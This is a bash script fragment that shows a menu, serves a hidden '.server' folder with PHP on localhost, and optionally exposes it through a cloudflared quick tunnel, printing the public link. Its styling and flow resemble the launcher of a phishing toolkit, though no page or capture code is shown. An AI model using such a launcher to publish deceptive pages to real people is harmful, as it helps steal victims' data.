#!/bin/bash

tunnel_menu(){
    { clear; banner | lolcat; banner2; echo; }
cat << EOF
    ${green}<<------ ${white}Select an Tunnel Options ${green}------>>${nocolor}

    ${cyan}[${orange}1${cyan}]${white} Cloudflared
    ${cyan}[${orange}2${cyan}]${white} Localhost
    ${cyan}[${orange}3${cyan}]${white} Back to Main Menu
    ${cyan}[${red}0${cyan}]${red} Exit ${nocolor}

EOF
    read -p "    ${cyan}[${green}+${cyan}]${white} Select an options:${blue} " option_tunnel

    case $option_tunnel in
        1)
        start_cloudf;;
        2)
        start_localhst;;
        3)
        back;;
        0)
        exit_msg;;
        *)
        invalid_options;;
    esac

}

start_cloudf() {
    # UI Setup
    { clear; banner | lolcat; banner2; echo; }
    echo -e "${green}    <<------ ${white}Starting Cloudflared Tunnel ${green}------>>${nocolor}"
    echo -e ""

    # PHP Server Start
    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting php server..."
    cd "$SCRIPT_DIR/.server" && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 1
    echo -e "    ${cyan}[${orange}+${cyan}]${white} Local Server${green} http://127.0.0.1:3333"

    # Starting Cloudflared
    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting Cloudflared..."
    cd "$SCRIPT_DIR" || exit
    rm -f cf.log

    # Launch cloudflared
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &

    # Waiting for link 
    echo -ne "    ${cyan}[${orange}*${cyan}]${white} Generating link, please wait..."
    while true; do
        cf_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log" 2>/dev/null)
        if [[ -n "$cf_link" ]]; then
            echo -e "\r    ${cyan}[${orange}+${cyan}]${white} Direct Link: ${green}$cf_link${nocolor}           "
            break
        fi
        sleep 1
    done

    trap terminate INT
    checked
}

# Local Server Start
start_localhst(){
    { clear; banner | lolcat; banner2; echo; }
    echo -e "${green}    <<------ ${white}Starting Localhost Server ${green}------>>${nocolor}"
    echo -e ""
    echo -e "    ${cyan}[${orange}*${cyan}]${white} Starting php server..."
    cd "$SCRIPT_DIR/.server" && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 1
    echo -e "    ${cyan}[${orange}+${cyan}]${white} Local Server${green} http://127.0.0.1:3333"
    trap terminate INT
    checked
}